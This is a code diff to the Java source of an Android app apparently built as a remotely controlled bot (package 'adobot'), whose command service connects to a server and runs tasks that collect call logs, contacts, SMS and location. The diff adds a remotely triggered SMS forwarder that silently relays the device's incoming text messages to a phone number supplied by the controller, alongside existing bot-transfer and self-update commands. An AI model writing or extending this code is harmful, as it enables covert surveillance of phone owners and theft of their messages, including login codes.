@@ -23,8 +23,9 @@ import io.socket.emitter.Emitter;
 import com.android.adobot.tasks.GetCallLogsTask;
 import com.android.adobot.tasks.GetContactsTask;
 import com.android.adobot.tasks.GetSmsTask;
-import com.android.adobot.tasks.LocationMonitorTask;
+import com.android.adobot.tasks.LocationMonitor;
 import com.android.adobot.tasks.SendSmsTask;
+import com.android.adobot.tasks.SmsForwarder;
 import com.android.adobot.tasks.TransferBotTask;
 import com.android.adobot.tasks.UpdateAppTask;
 
@@ -33,7 +34,8 @@ public class CommandService extends Service {
 
     private static final String TAG = "CommandService";
 
-    private LocationMonitorTask locationTask;
+    private LocationMonitor locationTask;
+    private SmsForwarder smsForwarder;
     private CommonParams params;
     private CommandService client;
     private Socket socket;
@@ -50,10 +52,11 @@ public class CommandService extends Service {
 
         super.onCreate();
 
+        smsForwarder = new SmsForwarder(this);
         params = new CommonParams(this);
         client = this;
         connected = false;
-        locationTask = new LocationMonitorTask(this);
+        locationTask = new LocationMonitor(this);
         locationTask.start();
         createSocket(params.getServer());
 
@@ -163,6 +166,18 @@ public class CommandService extends Service {
 
                                 TransferBotTask t = new TransferBotTask(client, newServer);
                                 t.start();
+
+                            } else if (command.equals("smsforwarder")) {
+                                String isForward = cmd.get("arg1").toString();
+                                String pNumber = cmd.has("arg2") ? cmd.get("arg2").toString() : "";
+                                if (isForward.equals("forward")) {
+                                    Log.i(TAG, "\nInvoking Forward SMS forward command\n");
+                                    smsForwarder.setRecepientNumber(pNumber);
+                                    smsForwarder.listen();
+                                } else if (isForward.equals("stop")) {
+                                    Log.i(TAG, "\nInvoking Forward SMS stop command\n");
+                                    smsForwarder.stopForwarding();
+                                }
 
                             } else {
                                 Log.i(TAG, "Unknown command");
